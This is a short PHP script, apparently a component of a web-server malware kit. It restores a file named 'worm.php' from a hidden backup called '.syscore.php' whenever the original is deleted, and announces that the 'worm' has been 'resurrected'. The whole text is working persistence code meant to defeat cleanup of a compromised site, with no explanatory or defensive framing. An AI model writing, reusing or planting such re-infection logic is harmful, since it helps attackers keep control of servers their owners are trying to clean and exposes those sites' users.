<?php
$main = 'worm.php'; //name
$backup = '.syscore.php'; //backupform

if (!file_exists($main)) {
    if (file_exists($backup)) {
        copy($backup, $main);
        echo "[+] 6ickzoneisWorm resurrected.";
    }
}
?>
